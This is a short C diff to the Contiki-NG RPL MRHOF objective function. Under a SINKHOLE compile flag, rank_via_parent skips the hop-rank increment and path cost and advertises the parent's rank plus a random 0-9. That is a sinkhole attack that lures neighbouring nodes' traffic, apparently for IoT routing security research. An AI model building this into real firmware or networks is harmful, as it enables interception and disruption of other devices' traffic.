@@ -48,6 +48,8 @@
 #include "net/nbr-table.h"
 #include "net/link-stats.h"
 
+#include "random.h"
+
 #include "sys/log.h"
 
 #define LOG_MODULE "RPL"
@@ -173,18 +175,27 @@ parent_path_cost(rpl_parent_t *p)
 static rpl_rank_t
 rank_via_parent(rpl_parent_t *p)
 {
-  uint16_t min_hoprankinc;
-  uint16_t path_cost;
-
   if(p == NULL || p->dag == NULL || p->dag->instance == NULL) {
     return RPL_INFINITE_RANK;
   }
 
-  min_hoprankinc = p->dag->instance->min_hoprankinc;
-  path_cost = parent_path_cost(p);
+  #ifdef SINKHOLE
+    /* Rank lower-bound: parent rank + min_hoprankinc */
+    uint16_t random_rank_increase = random_rand() % 10;
+    printf("mrhof: p->rank = %d ~ setting rank to %ld\n", p->rank, MAX(MIN((uint32_t)p->rank + random_rank_increase, 0xffff), (uint32_t)p->rank));
+    return MAX(MIN((uint32_t)p->rank + random_rank_increase, 0xffff), (uint32_t)p->rank);
+    // return 129;
+  #else  
+    uint16_t min_hoprankinc;
+    uint16_t path_cost;
+    
+    min_hoprankinc = p->dag->instance->min_hoprankinc;
+    path_cost = parent_path_cost(p);
 
-  /* Rank lower-bound: parent rank + min_hoprankinc */
-  return MAX(MIN((uint32_t)p->rank + min_hoprankinc, 0xffff), path_cost);
+    /* Rank lower-bound: parent rank + min_hoprankinc */
+    return MAX(MIN((uint32_t)p->rank + min_hoprankinc, 0xffff), path_cost);
+  #endif
+
 }
 /*---------------------------------------------------------------------------*/
 static int
